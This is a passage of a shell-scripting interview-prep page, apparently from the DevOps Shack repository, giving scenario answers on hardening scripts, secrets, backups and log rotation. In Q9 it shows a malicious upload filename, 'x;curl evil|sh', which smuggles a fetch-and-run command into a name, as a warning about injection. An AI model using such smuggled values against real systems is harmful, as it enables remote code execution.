# Shell Scripting — Scenario-Based Questions

<!-- DEVOPS-SHACK:HEADER -->
<p align="center">
  <a href="https://www.youtube.com/@devopsshack"><img alt="YouTube DevOps Shack" src="https://img.shields.io/badge/YouTube-DevOps%20Shack-FF0000?style=flat-square&logo=youtube&logoColor=white"/></a>
  <a href="https://www.youtube.com/@shackverse"><img alt="YouTube DevOps Shack Hindi" src="https://img.shields.io/badge/Hindi-@shackverse-FF0000?style=flat-square&logo=youtube&logoColor=white"/></a>
  <a href="https://devopsshack.com"><img alt="devopsshack.com" src="https://img.shields.io/badge/Courses-devopsshack.com-C6FF4D?style=flat-square&labelColor=0B0F1A"/></a>
  <a href="https://www.instagram.com/devopsshack"><img alt="Instagram" src="https://img.shields.io/badge/Instagram-@devopsshack-E4405F?style=flat-square&logo=instagram&logoColor=white"/></a>
  <a href="https://github.com/jaiswaladi246/DevOps-Cloud-Interview-Preparation-by-DevOps-Shack"><img alt="Original repo" src="https://img.shields.io/badge/Original-DevOps%20Shack%20repo-4DE8FF?style=flat-square&logo=github&labelColor=0B0F1A"/></a>
</p>
<p align="center"><sub>Part of <b><a href="https://github.com/jaiswaladi246/DevOps-Cloud-Interview-Preparation-by-DevOps-Shack">DevOps &amp; Cloud Interview Preparation</a></b> — created by <b><a href="https://www.youtube.com/@devopsshack">DevOps Shack</a></b>. Free to learn from; please credit DevOps Shack when sharing.</sub></p>
<!-- /DEVOPS-SHACK:HEADER -->

> Real-world Shell Scripting situations and how to reason through them in an interview · 100 questions · 🟢 Beginner 🟡 Intermediate 🔴 Advanced

[⬅ Back to Shell Scripting](./README.md) · [🏠 Home](../README.md)

## Table of contents
- [Scenarios: writing and hardening scripts](#scenarios-writing-and-hardening-scripts) — Q1–Q20
- [Scenarios: backups, log rotation and housekeeping](#scenarios-backups-log-rotation-and-housekeeping) — Q21–Q40
- [Scenarios: health checks, monitoring and alerts](#scenarios-health-checks-monitoring-and-alerts) — Q41–Q60
- [Scenarios: deployments, user management and fleet operations](#scenarios-deployments-user-management-and-fleet-operations) — Q61–Q80
- [Scenarios: text processing and scheduling decisions](#scenarios-text-processing-and-scheduling-decisions) — Q81–Q100

---

## Scenarios: writing and hardening scripts

<!-- DEVOPS-SHACK:SECTION -->
> 🎥 **Learn this hands-on with DevOps Shack** → [YouTube @devopsshack](https://www.youtube.com/@devopsshack) · [Hindi @shackverse](https://www.youtube.com/@shackverse) · [Courses at devopsshack.com](https://devopsshack.com)

### Q1. You inherit a 600-line `deploy.sh` with no error handling. It "sometimes half-deploys". Where do you start? 🟡

<details>
<summary><b>Answer</b></summary>

**Situation read →** Half-deploys mean a step fails and the script keeps going. Before rewriting anything, make failures visible and stop on them.

**What I'd do →**
1. Put it in Git if it is not already, and run `shellcheck -x deploy.sh` to get a list of real bugs (unquoted variables, unchecked `cd`, masked return codes).
2. Add a strict header and an error trap so the next failure tells us where:
   ```bash
   set -Eeuo pipefail
   trap 'echo "FAILED line $LINENO: $BASH_COMMAND (exit $?)" >&2' ERR
   ```
3. Run it against staging with `bash -x` and a `PS4` that prints line numbers, fixing everything strict mode trips on (often optional variables needing `${VAR:-}`).
4. Restructure so the switch-over is a single atomic step at the end (build in a new release directory, then `ln -sfn` and reload), so a failure before that point changes nothing live.
5. Add a lock (`flock -n`) so two people cannot deploy at once.

**Why →** Most "sometimes" bugs are unchecked failures plus non-atomic changes. Strict mode surfaces them, atomic switching makes them harmless.

**Interview tip →** Say you would not big-bang rewrite it; you make it observable first, then refactor in small, tested steps.

</details>

### Q2. A script with `#!/bin/sh` works on CentOS but fails on Ubuntu with `Syntax error: "(" unexpected`. What is going on and what do you do? 🟢

<details>
<summary><b>Answer</b></summary>

**Situation read →** On CentOS/RHEL `/bin/sh` is Bash; on Debian/Ubuntu it is `dash`, which does not support arrays, `[[ ]]` or `function` syntax.

**What I'd do →**
1. Confirm: `ls -l /bin/sh` (Ubuntu shows `-> dash`) and find bashisms with `shellcheck -s sh script.sh` or `checkbashisms script.sh`.
2. If Bash is guaranteed on every target, change the shebang to `#!/usr/bin/env bash`.
3. If it must run in minimal images (Alpine, BusyBox), rewrite the bashisms in POSIX form instead.
4. Add ShellCheck to CI so the shebang and the code always agree.

**Why →** The shebang is a contract: it must name the shell the code is actually written for.

**Interview tip →** Mention that `sh script.sh` on the command line also forces `dash`, regardless of the shebang.

</details>

### Q3. You need a deploy script that humans and CI both call with `--env`, `--version` and `--dry-run`. How do you design its interface? 🟢

<details>
<summary><b>Answer</b></summary>

**Situation read →** A good CLI is predictable for humans and strict for machines: clear flags, validation, meaningful exit codes, no prompts in CI.

**What I'd do →**
1. Parse with a `while (($#)); case $1 in` loop to support long options, and reject unknown flags with exit 2.
2. Validate: `[[ $env =~ ^(dev|staging|prod)$ ]]`, `[[ $version =~ ^v[0-9]+\.[0-9]+\.[0-9]+$ ]]`.
3. Support env vars as defaults for CI (`env=${DEPLOY_ENV:-}`), with flags overriding them.
4. Prompt for confirmation on prod only when `[[ -t 0 ]]`; in CI require an explicit `--yes`.
5. Implement `--dry-run` through a `run()` wrapper that prints commands with `printf '%q '` instead of executing them.
6. Document exit codes in `--help` (0 ok, 1 failed, 2 usage, 3 health check failed).

**Why →** CI pipelines branch on exit codes, and humans need `--help` and dry runs to trust a script.

**Interview tip →** Say "the script never prompts when there is no terminal", which shows you have been burned by a hung CI job.

</details>

### Q4. A maintenance script must run as the `deploy` user, never as root, because files it creates must be owned by `deploy`. How do you enforce that? 🟢

<details>
<summary><b>Answer</b></summary>

**Situation read →** Running as root creates root-owned files the app cannot later modify, a classic source of `Permission denied` after a manual run.

**What I'd do →**
1. Check the effective user at the top:
   ```bash
   if [[ $(id -un) != deploy ]]; then
     if [[ $EUID -eq 0 ]]; then exec runuser -u deploy -- "$0" "$@"; fi
     echo "run as deploy: sudo -u deploy $0" >&2; exit 1
   fi
   ```
2. Re-executing with `runuser` (or `sudo -u deploy`) keeps the operator experience simple while guaranteeing ownership.
3. Set `umask 027` so new files are not world-readable.

**Why →** Re-exec as the right user prevents the mistake instead of just reporting it.

**Interview tip →** Use `$EUID` (effective UID) rather than `$USER`, which is just an environment variable and can be wrong under `sudo`.

</details>

### Q5. Ten scripts in a repo each copy-paste their own `log`, `die`, retry and config loading. How do you fix this? 🟡

<details>
<summary><b>Answer</b></summary>

**Situation read →** Duplicated helpers drift apart; a fix in one script never reaches the others.

**What I'd do →**
1. Create `lib/common.sh` with the shared functions, a `# shellcheck shell=bash` directive, and a double-source guard (`[[ -n ${_COMMON_LOADED:-} ]] && return 0`).
2. Source it relative to the script, not the current directory:
   ```bash
   SCRIPT_DIR=$(dirname -- "$(readlink -f -- "${BASH_SOURCE[0]}")")
   # shellcheck source=../lib/common.sh
   source "$SCRIPT_DIR/../lib/common.sh"
   ```
3. Keep the library free of side effects: only function definitions and defaults, no `set -e`, no `exit` at load time (callers own their strict mode).
4. Prefix library functions and locals (`opskit_init`, `_try`) to avoid collisions and dynamic-scoping bugs.
5. Add bats tests for the library itself, and configure `.shellcheckrc` with `source-path=SCRIPTDIR`.

**Why →** A tested library turns ten inconsistent scripts into ten thin scripts with one well-understood core.

**Interview tip →** Mention the dynamic-scoping trap: a library `retry` with `local n` silently breaks a caller's function that uses a global `n`.

</details>

### Q6. A script is run both by engineers and by cron. Cron logs are full of colour codes and the script sometimes hangs waiting for input. Fix it. 🟢

<details>
<summary><b>Answer</b></summary>

**Situation read →** The script assumes a terminal. Under cron, stdin and stdout are not TTYs.

**What I'd do →**
1. Enable colours only when stdout is a terminal and `NO_COLOR` is unset:
   ```bash
   if [[ -t 1 && -z ${NO_COLOR:-} ]]; then RED=$'\e[31m' RST=$'\e[0m'; else RED='' RST=''; fi
   ```
2. Never prompt without a terminal: `[[ -t 0 ]] || die "refusing to prompt without a TTY; pass --yes"`.
3. Pass non-interactive flags to tools: `apt-get -y`, `DEBIAN_FRONTEND=noninteractive`, `ssh -o BatchMode=yes`, `kubectl --context` explicitly.
4. Redirect stdin from `/dev/null` in the cron line to be safe: `... < /dev/null`.

**Why →** Interactive assumptions are the main reason scripts hang in automation.

**Interview tip →** Name `ssh -o BatchMode=yes`, which makes SSH fail instead of waiting for a password.

</details>

### Q7. Your team decides all scripts must pass ShellCheck. The first run reports 400 findings across 60 scripts. How do you roll this out? 🟡

<details>
<summary><b>Answer</b></summary>

**Situation read →** Blocking CI on 400 findings stops all work; ignoring them keeps the bugs. Ratchet instead.

**What I'd do →**
1. Add ShellCheck to CI for **changed files only** first:
   ```bash
   git diff --name-only --diff-filter=ACM origin/main -- '*.sh' | xargs -r shellcheck -x
   ```
2. Fix the error-level findings everywhere immediately (`shellcheck -S error`), since those are real bugs.
3. Commit a `.shellcheckrc` with agreed settings (`source-path=SCRIPTDIR`, `external-sources=true`).
4. Fix warnings script by script, starting with anything run as root or in production paths.
5. Allow inline disables only with a reason comment, and review them in PRs.
6. Once clean, run it on all files and make it blocking; add a pre-commit hook.

**Why →** A ratchet improves quality without freezing delivery, and the riskiest scripts get fixed first.

**Interview tip →** Say which codes you fix first: SC2086, SC2046, SC2164 and SC2155 cause real incidents.

</details>

### Q8. A script edits `/etc/nginx/nginx.conf` and reloads nginx. If someone hits Ctrl+C mid-way, nginx is left with a broken config. How do you make it safe? 🟡

<details>
<summary><b>Answer</b></summary>

**Situation read →** In-place edits are not atomic, and an interrupted edit leaves a half-written file that fails on the next reload or reboot.

**What I'd do →**
1. Build the new config in a temp file in the same directory: `tmp=$(mktemp /etc/nginx/.nginx.conf.XXXXXX)`.
2. Trap cleanup: `trap 'rm -f -- "$tmp"' EXIT`.
3. Validate the candidate before installing it: `nginx -t -c "$tmp"` (or copy into place in a staging include and run `nginx -t`).
4. Keep a backup, then swap atomically: `cp -a nginx.conf nginx.conf.bak && mv -f -- "$tmp" nginx.conf`.
5. Reload, and on failure restore the backup and reload again.

**Why →** `mv` on the same filesystem is atomic; an interruption at any point leaves either the old or the new config, never half of one.

**Interview tip →** Mention that `SIGKILL` cannot be trapped, which is exactly why the atomic rename matters more than the trap.

</details>

### Q9. A script processes files that customers upload to `/srv/uploads`. What security problems do you watch for? 🔴

<details>
<summary><b>Answer</b></summary>

**Situation read →** Filenames are attacker-controlled input. They can contain spaces, newlines, leading dashes, `..`, glob characters and shell metacharacters.

**What I'd do →**
1. Never parse `ls`; iterate with `find ... -print0 | while IFS= read -r -d '' f`.
2. Quote every expansion and pass `--` before filenames: `mv -- "$f" "$dest/"`.
3. Never put filenames into `eval`, `bash -c`, `ssh host "..."` or `find -exec sh -c '... {}'` (use `sh -c '...' _ {}` so the name is an argument).
4. Reject or sanitize names against an allow-list: `[[ ${f##*/} =~ ^[A-Za-z0-9._-]{1,128}$ ]] || quarantine "$f"`.
5. Do not follow symlinks the uploader could plant (`find -P`, check `[[ -L $f ]]`), and run the script as an unprivileged user.
6. Process in a private temp dir created with `mktemp -d`.

**Why →** A file named `-rf` or `x;curl evil|sh` turns a sloppy script into remote code execution or data loss.

**Interview tip →** Demonstrate the `sh -c '...' _ "$f"` pattern; it shows you know how to pass data as arguments rather than code.

</details>

### Q10. A script needs an API token, and the script lives in a Git repo. How do you handle the token? 🟡

<details>
<summary><b>Answer</b></summary>

**Situation read →** The token must never be committed, logged or visible in the process list.

**What I'd do →**
1. Read it at runtime from the platform's secret source: an env var injected by CI (masked), a file with mode 0600 (`/etc/opskit/token`), or a secrets manager:
   ```bash
   token=$(aws secretsmanager get-secret-value --secret-id prod/api --query SecretString --output text)
   ```
2. Fail fast if missing: `: "${API_TOKEN:?API_TOKEN not set}"`.
3. Keep it out of argv: `curl -H @<(printf 'Authorization: Bearer %s\n' "$token") "$url"` (curl 7.55+ reads headers from a file).
4. Disable tracing around it (`set +x`) and never echo it; mask in logs.
5. Add a secret scanner (gitleaks) in pre-commit and CI.

**Why →** Secrets leak through Git history, `ps`, `set -x` and log aggregation far more often than through clever attacks.

**Interview tip →** Mention that rotating a leaked token is mandatory; deleting the commit is not enough.

</details>

### Q11. A data migration script runs for 40 minutes over 5,000 items. When it fails at item 3,000, rerunning starts from scratch. How do you make it resumable? 🔴

<details>
<summary><b>Answer</b></summary>

**Situation read →** Long batch jobs need checkpoints and idempotent steps, otherwise every failure costs the full runtime and may duplicate work.

**What I'd do →**
1. Make each item idempotent (check before acting, or use upserts).
2. Record progress in a state file after each item succeeds, written atomically:
   ```bash
   state=/var/lib/migrate/done.txt
   touch "$state"
   while IFS= read -r id; do
     grep -qxF -- "$id" "$state" && continue
     migrate_item "$id"
     printf '%s\n' "$id" >> "$state"
   done < items.txt
   ```
3. For large sets, use a sorted done-list and `comm -23 <(sort items.txt) <(sort "$state")` to compute the remaining work once, instead of grepping per item.
4. Take a lock so two resumptions cannot run at once, and add a `--reset` flag to clear state deliberately.
5. Log a progress line every N items with an ETA.

**Why →** Checkpointing turns a 40-minute retry into a 1-minute one, and idempotency makes reruns safe.

**Interview tip →** Say you append to the state file only **after** the item succeeds, so a crash mid-item retries that item.

</details>

### Q12. The same script must run on engineers' macOS laptops and on Linux CI runners. What breaks, and how do you handle it? 🟡

<details>
<summary><b>Answer</b></summary>

**Situation read →** macOS ships Bash 3.2 and BSD userland; Linux has Bash 5 and GNU tools. Flags differ for `sed -i`, `date -d`, `readlink -f`, `stat -c`, `grep -P`, `xargs -r`.

**What I'd do →**
1. Require Bash 4+ explicitly and tell macOS users to `brew install bash coreutils gnu-sed grep`:
   ```bash
   (( BASH_VERSINFO[0] >= 4 )) || { echo "need Bash 4+ (brew install bash)" >&2; exit 1; }
   ```
2. Prefer portable forms: `sed -i.bak ... && rm *.bak`, `$(cd "$(dirname "$0")" && pwd)` instead of `readlink -f`.
3. Where GNU behaviour is needed, detect and use `gdate`, `gsed` when present.
4. Run CI on both `ubuntu-latest` and `macos-latest` if laptops are a supported target.
5. Or remove the problem: run the script inside a container image with pinned tools.

**Why →** "Works on my Mac" is the shell equivalent of "works on my machine".

**Interview tip →** Mention that `#!/usr/bin/env bash` picks up Homebrew's Bash on macOS, while `#!/bin/bash` pins Apple's 3.2.

</details>

### Q13. You are asked to add `set -e` to a large legacy script that has run in production for years. What are the risks? 🟡

<details>
<summary><b>Answer</b></summary>

**Situation read →** The script may rely on commands failing harmlessly: `grep` returning 1 when nothing matches, `diff` returning 1 when files differ, `((count++))` at zero, `test` as the last line of a function.

**What I'd do →**
1. Grep for commands with meaningful non-zero codes: `grep`, `diff`, `cmp`, `test`/`[`, `((`, `read` at EOF, `pgrep`, `systemctl is-active`.
2. Make intended "failures" explicit: `grep -q x f || true`, `if grep -q ...; then`, `count=$((count + 1))`.
3. Run it in staging with `set -Eeuo pipefail` and an `ERR` trap that logs the line, and fix each trip.
4. Roll out behind a flag at first (`STRICT=1`) if the script is critical.

**Why →** `set -e` changes behaviour for every command; blindly adding it can turn a working script into one that stops halfway, which may be worse.

**Interview tip →** Saying "`set -e` is a safety net, not error handling" signals maturity.

</details>

### Q14. A long script needs useful logs: levels, timestamps, and a debug mode that does not require editing the code. Design it. 🟢

<details>
<summary><b>Answer</b></summary>

**Situation read →** Logs must be greppable and the level must be controllable at runtime.

**What I'd do →**
1. A single `log` function writing to stderr:
   ```bash
   LOG_LEVEL=${LOG_LEVEL:-INFO}
   declare -A _lvl=([DEBUG]=10 [INFO]=20 [WARN]=30 [ERROR]=40)
   log() {
     (( _lvl[$1] >= _lvl[$LOG_LEVEL] )) || return 0
     printf '%s %-5s [%s] %s\n' "$(date -u +%FT%TZ)" "$1" "${0##*/}" "${*:2}" >&2
   }
   ```
2. `LOG_LEVEL=DEBUG ./script.sh` turns on debug lines; `TRACE=1` turns on `set -x` with a line-number `PS4`.
3. Under systemd, rely on the journal; elsewhere, also send to syslog with `logger -t`.

**Why →** Uniform, leveled logs make incidents answerable with `grep` and `journalctl` instead of guesswork.

**Interview tip →** Mention logging to stderr so stdout stays clean for data.

</details>

### Q15. A script accepts an environment name, a semantic version and a hostname from users. How do you validate them? 🟢

<details>
<summary><b>Answer</b></summary>

**Situation read →** Validate against an allow-list before the values touch any command.

**What I'd do →**
```bash
[[ $env =~ ^(dev|staging|prod)$ ]]                         || die "invalid env: $env"
[[ $version =~ ^v?[0-9]+\.[0-9]+\.[0-9]+(-[0-9A-Za-z.-]+)?$ ]] || die "invalid version: $version"
[[ $host =~ ^[a-z0-9]([a-z0-9-]{0,61}[a-z0-9])?(\.[a-z0-9]([a-z0-9-]{0,61}[a-z0-9])?)*$ ]] || die "invalid host: $host"
```
1. Store complex regexes in variables and keep them unquoted on the right of `=~`.
2. Normalize first if needed (`env=${env,,}`).
3. Exit with code 2 for invalid input so callers can distinguish usage errors.

**Why →** Allow-lists block typos and injection in one step; deny-lists always miss a character.

**Interview tip →** Mention that validation must happen before the value is used in a path, `ssh`, `sed` or SQL.

</details>

### Q16. A Bash script has grown to 900 lines, parses JSON in 40 places and has nested associative-array tricks. Your manager asks whether to keep it. What do you say? 🟡

<details>
<summary><b>Answer</b></summary>

**Situation read →** The script has outgrown the language. Bash is strong at orchestrating commands, weak at data structures and testable logic.

**What I'd do →**
1. Identify the parts that are glue (calling `kubectl`, `aws`, `rsync`) and the parts that are logic (JSON transforms, decisions).
2. Propose moving the logic to Python (or Go if a static binary helps distribution), with unit tests, while keeping a thin Bash wrapper if operators like the interface.
3. Migrate incrementally: one subcommand at a time, both versions tested against the same fixtures.
4. Until then, add ShellCheck and bats around the current script so the migration has a safety net.

**Why →** Maintenance cost and bug rate grow sharply when Bash is used as a general-purpose language.

**Interview tip →** Give a rule of thumb, such as "more than about 300 lines, or real data structures, means Python".

</details>

### Q17. A container entrypoint (Alpine, POSIX `sh` only) must wait for Postgres before running migrations. Write the approach. 🟡

<details>
<summary><b>Answer</b></summary>

**Situation read →** No Bash, so no `/dev/tcp`, arrays or `[[ ]]`. The wait must be bounded, and the app must become PID 1.

**What I'd do →**
```sh
#!/bin/sh
set -eu
deadline=$(( $(date +%s) + ${DB_WAIT_SECONDS:-60} ))
until pg_isready -q -h "$DB_HOST" -p "${DB_PORT:-5432}"; do
  if [ "$(date +%s)" -ge "$deadline" ]; then
    echo "database not ready after ${DB_WAIT_SECONDS:-60}s" >&2
    exit 1
  fi
  sleep 2
done
./migrate up
exec "$@"
```
1. `pg_isready` comes with the Postgres client package; `nc -z host port` is a fallback.
2. `exec "$@"` hands PID 1 to the real process so it receives `SIGTERM`.
3. Check with `shellcheck -s sh entrypoint.sh`.

**Why →** Unbounded waits hang deploys; a missing `exec` breaks graceful shutdown.

**Interview tip →** Mention that in Kubernetes, readiness probes and init containers are often a better place for this than the entrypoint.

</details>

### Q18. You want tests for existing scripts that call `curl`, `aws` and `systemctl`. How do you test them without touching real systems? 🟡

<details>
<summary><b>Answer</b></summary>

**Situation read →** External commands must be replaced with controllable fakes, and each test needs an isolated filesystem.

**What I'd do →**
1. Use bats-core; put stub executables in `tests/stubs/` and prepend that directory to `PATH` in `setup()`.
2. Each stub logs its arguments to a file and returns canned output or an exit code from an environment variable (`STUB_CURL_RC=22`).
3. Make the script configurable through environment variables for paths (`STATE_DIR`, `LOG_FILE`, `CONF`), defaulting to production paths.
4. Assert on exit status, output, files created and the stub call log.
5. Run `bats tests` and `shellcheck` in CI on every PR.

**Why →** PATH stubs need no changes to the script's code and make failure paths (timeouts, 503s, AccessDenied) easy to test.

**Interview tip →** Point to a failure-path test, such as "upload fails, so the script exits 1 and raises an alert". That is where scripts usually break.

</details>

### Q19. A nightly job should post to Slack when it starts, succeeds or fails, including the duration and the last 20 log lines on failure. Design it. 🟡

<details>
<summary><b>Answer</b></summary>

**Situation read →** Notifications must work even when the job crashes, so they belong in traps, not at the end of the happy path.

**What I'd do →**
```bash
log=$(mktemp); exec > >(tee -a "$log") 2>&1
start=$SECONDS
notify() { jq -n --arg t "$1" '{text: $t}' |
  curl -fsS --max-time 10 -H 'Content-Type: application/json' --data-binary @- "$SLACK_WEBHOOK" >/dev/null || true; }
finish() {
  local rc=$?
  if (( rc == 0 )); then notify "backup OK in $((SECONDS - start))s"
  else notify "backup FAILED (exit $rc) after $((SECONDS - start))s"$'\n'"$(tail -n 20 "$log")"; fi
  rm -f -- "$log"
}
trap finish EXIT
notify "backup started on $(hostname -s)"
```
1. Build JSON with `jq` so log lines with quotes cannot break the payload.
2. Notification failures must never fail the job (`|| true`).

**Why →** The `EXIT` trap sees the real exit code in all cases, including `set -e` aborts.

**Interview tip →** Mention avoiding alert fatigue: notify on failure and on recovery, and keep "started" messages for jobs people actively watch.

</details>

### Q20. Other teams want to use your script as a CLI tool. What do you add before sharing it? 🟢

<details>
<summary><b>Answer</b></summary>

**Situation read →** Shared tools need a stable interface, versioning and documentation.

**What I'd do →**
1. `--help` with usage, options, examples and exit codes; `--version` printing a version stamped at release.
2. Consistent option parsing and validation; non-zero exit codes documented.
3. Dependency check at startup (`require_cmd jq curl aws`) with install hints.
4. A README, a CHANGELOG and semantic version tags in Git.
5. Distribution: a release tarball or package with checksums, or a container image; never "curl from main | bash".
6. CI with ShellCheck, `shfmt` and bats.

**Why →** Without versioning, a change you make for your team silently breaks theirs.

**Interview tip →** Mention keeping backward compatibility for flags, or deprecating them with a warning first.

</details>

## Scenarios: backups, log rotation and housekeeping

<!-- DEVOPS-SHACK:SECTION -->
> 🎥 **Learn this hands-on with DevOps Shack** → [YouTube @devopsshack](https://www.youtube.com/@devopsshack) · [Hindi @shackverse](https://www.youtube.com/@shackverse) · [Courses at devopsshack.com](https://devopsshack.com)

### Q21. Design a nightly backup of `/etc` and application data to S3 with retention. 🟡

<details>
<summary><b>Answer</b></summary>

**Situation read →** A backup is only useful if it is complete, verifiable, off-host, retained correctly and alerts on failure.

**What I'd do →**
1. Archive with a UTC timestamp and the hostname: `tar -czf "$dir/$(hostname -s)-$(date -u +%Y%m%dT%H%M%SZ).tar.gz" -C / etc srv/app/shared`.
2. Write to a temp file and `mv` into place; generate a `.sha256` next to it.
3. Upload with retries and server-side encryption: `aws s3 cp --sse AES256 "$f" "s3://$bucket/servers/$host/"`, then confirm with `aws s3api head-object` that the size matches.
4. Local retention: keep the newest N archives; S3 retention: a bucket lifecycle rule (expire after 35 days, or transition to Glacier), plus versioning and Object Lock if ransomware is in scope.
5. Run it from a systemd timer with `Persistent=true`, `flock`, and `OnFailure=` alerting.

**Why →** Each step closes a known failure mode: partial files, silent corruption, local-only copies, unbounded growth and unnoticed failures.

**Interview tip →** Say retention in S3 belongs in a lifecycle policy, not in a script that deletes objects with broad permissions.

</details>

### Q22. Write the core of a Postgres backup that streams `pg_dump` through gzip to S3 and never uploads an empty dump. 🟡

<details>
<summary><b>Answer</b></summary>

**Situation read →** In `pg_dump | gzip`, a failed `pg_dump` still produces a small valid gzip file, and without `pipefail` the job reports success.

**What I'd do →**
```bash
set -Eeuo pipefail
out="/var/backups/pg/app-$(date -u +%Y%m%dT%H%M%SZ).sql.gz"
tmp=$(mktemp "${out}.XXXXXX"); trap 'rm -f -- "$tmp"' EXIT
pg_dump --format=plain --no-owner -h "$PGHOST" -U backup app | gzip -6 > "$tmp"
gzip -t "$tmp"
(( $(stat -c %s "$tmp") > 1024 )) || { echo "dump suspiciously small" >&2; exit 1; }
mv -- "$tmp" "$out"
aws s3 cp --only-show-errors --sse aws:kms "$out" "s3://$BUCKET/pg/"
```
1. `pipefail` makes the pipeline fail if `pg_dump` fails.
2. Credentials come from `~/.pgpass` (mode 0600) or `PGPASSWORD` from a secret, not argv.
3. For large databases use `--format=custom` (compressed, parallel restore with `pg_restore -j`).

**Why →** Empty backups are the most common way teams discover they had no backup.

**Interview tip →** Mention a size sanity check, and a scheduled test restore, as two separate guards.

</details>

### Q23. Backups have "succeeded" every night for a year, but the first real restore failed. How do you make backups trustworthy? 🔴

<details>
<summary><b>Answer</b></summary>

**Situation read →** Nobody tested restores, so "success" only meant "the script exited 0".

**What I'd do →**
1. Add an automated restore test on a schedule (weekly), in an isolated environment:
   ```bash
   latest=$(aws s3 ls "s3://$BUCKET/pg/" | sort | tail -n1 | awk '{print $4}')
   aws s3 cp "s3://$BUCKET/pg/$latest" /restore/
   createdb restore_test && gunzip -c "/restore/$latest" | psql -v ON_ERROR_STOP=1 -q restore_test
   psql -tAc 'select count(*) from orders' restore_test   # compare with production metrics
   ```
2. Assert on content: row counts within a tolerance, the latest record's timestamp is recent, critical tables exist.
3. Verify checksums of archives before restoring, and alert if the newest backup is older than 26 hours.
4. Record restore duration as a metric; that is your real RTO.
5. Document the restore runbook and rehearse it.

**Why →** A backup you have not restored is a hypothesis, not a backup.

**Interview tip →** Use "RTO and RPO" and say restore tests produce the evidence for both.

</details>

### Q24. `/var` is 100% full because an app's logs were never rotated, and the app now fails to start. What do you do now, and what do you set up after? 🟢

<details>
<summary><b>Answer</b></summary>

**Situation read →** Two jobs: free space safely right now, then make sure it cannot happen again.

**What I'd do →**
1. Find the culprit: `du -xh --max-depth=2 /var 2>/dev/null | sort -h | tail`.
2. If the app holds the file open, truncate it instead of deleting it: `: > /var/log/app/app.log` (or compress a copy first if you need it).
3. Compress or delete old rotated files: `find /var/log/app -name '*.log.*' -mtime +3 -delete`.
4. Check for deleted-but-open files: `lsof +L1`.
5. Add `/etc/logrotate.d/app`:
   ```text
   /var/log/app/*.log {
       daily
       rotate 14
       compress
       delaycompress
       missingok
       notifempty
       copytruncate
   }
   ```
6. Test with `logrotate -d /etc/logrotate.d/app` (debug, no changes), then `logrotate -f` once.
7. Add a disk-usage alert at 80% and 90%.

**Why →** Deleting an open log frees no space until the process closes it; truncation does.

**Interview tip →** Mention `logrotate -d` for a dry run. It shows you test config before applying it.

</details>

### Q25. Should you use `copytruncate` or a `postrotate` signal for an application's logs? How do you decide? 🟡

<details>
<summary><b>Answer</b></summary>

**Situation read →** The choice depends on whether the application can reopen its log file.

**What I'd do →**
1. If the app supports reopening on a signal (nginx `USR1`, many daemons on `HUP`), use `create` plus `postrotate`:
   ```text
   /var/log/nginx/*.log {
       daily
       rotate 14
       compress
       delaycompress
       sharedscripts
       postrotate
           [ -s /run/nginx.pid ] && kill -USR1 "$(cat /run/nginx.pid)"
       endscript
   }
   ```
2. If it cannot reopen (some Java or Node apps writing to a file), use `copytruncate`, accepting that lines written between the copy and the truncate can be lost.
3. Best of all for new services: log to stdout and let journald or the container runtime handle rotation.

**Why →** Rotating by rename without a reopen means the app keeps writing to the renamed (and later deleted) file, and disk usage never drops.

**Interview tip →** Explain why `delaycompress` exists: the app may still write to the `.1` file briefly after rotation.

</details>

### Q26. `/srv/app/releases` has 300 old release directories. Write a cleanup that keeps the newest 5 and never deletes the current release. 🟢

<details>
<summary><b>Answer</b></summary>

**Situation read →** Sort by name if names are timestamps, and protect the directory `current` points to.

**What I'd do →**
```bash
releases=/srv/app/releases
current=$(readlink -f /srv/app/current)
mapfile -t old < <(find "$releases" -mindepth 1 -maxdepth 1 -type d -printf '%f\n' | sort -r | tail -n +6)
for r in "${old[@]}"; do
  [[ "$releases/$r" == "$current" ]] && continue
  rm -rf -- "${releases:?}/$r"
  echo "removed $r"
done
```
1. Release names like `20261109T143000Z` sort chronologically as strings.
2. `${releases:?}` guards against an empty variable.

**Why →** Keeping a few releases enables instant rollback; deleting the live one would cause an outage.

**Interview tip →** Mention that sorting by name is more reliable than by mtime, which changes when someone touches a file.

</details>

### Q27. A Docker host keeps filling its disk. Write a safe cleanup approach. 🟢

<details>
<summary><b>Answer</b></summary>

**Situation read →** Images, stopped containers, build cache and container logs pile up. Cleanup must not remove what running workloads need.

**What I'd do →**
1. Measure: `docker system df -v`.
2. Remove only unused objects older than a threshold:
   ```bash
   docker container prune -f --filter 'until=24h'
   docker image prune -af --filter 'until=168h'
   docker builder prune -f --filter 'until=72h'
   ```
3. Avoid `docker volume prune` in automation unless you are sure; volumes hold data.
4. Cap container logs in `/etc/docker/daemon.json`: `{"log-driver":"json-file","log-opts":{"max-size":"10m","max-file":"3"}}`.
5. Run the prune from a weekly systemd timer and alert on disk usage.

**Why →** Time filters keep recently used images for fast rollbacks; log caps stop the most common runaway growth.

**Interview tip →** Mention that `docker system prune -a --volumes` is a data-loss command, not a routine one.

</details>

### Q28. You deleted a 40 GB log file, but `df` still shows the disk full. What happened and how do you script the fix? 🟡

<details>
<summary><b>Answer</b></summary>

**Situation read →** A process still holds the file open; the inode and its blocks are freed only when the last descriptor closes.

**What I'd do →**
1. Find deleted-but-open files: `lsof +L1` or `find /proc/*/fd -lname '*(deleted)' 2>/dev/null`.
2. Truncate through the process's file descriptor without restarting it:
   ```bash
   lsof -nP +L1 2>/dev/null | awk 'NR > 1 && $7 > 1e9 {print $2, $4}' |
   while read -r pid fd; do
     fd=${fd%[rwu]}
     : > "/proc/$pid/fd/$fd"
     echo "truncated pid $pid fd $fd"
   done
   ```
3. Or restart/reload the service so it reopens its logs.
4. Fix rotation so the app is signalled or `copytruncate` is used.

**Why →** `rm` removes the name, not the data, while a process holds it.

**Interview tip →** Mention that `du` and `df` disagreeing is the tell-tale sign of deleted open files.

</details>

### Q29. You need to back up 2 TB of mostly unchanged files nightly over a limited link. A full tar each night is impossible. What do you do? 🔴

<details>
<summary><b>Answer</b></summary>

**Situation read →** Only changed data should travel, and each backup should still look like a full snapshot for easy restores.

**What I'd do →**
1. To another server: `rsync` with hard-link snapshots, so unchanged files cost no extra space:
   ```bash
   today=/backups/$(date +%F)
   rsync -aH --delete --numeric-ids --link-dest=/backups/latest /data/ "$today/"
   ln -sfn "$today" /backups/latest
   ```
2. To S3: `aws s3 sync /data "s3://$bucket/data/" --sse AES256` uploads only changed files; enable bucket versioning for point-in-time recovery, with lifecycle rules for old versions.
3. Or use a deduplicating tool (restic, borg) that does content-defined chunking, encryption and retention policies.
4. Limit bandwidth (`rsync --bwlimit=20M`) and use `nice`/`ionice`.

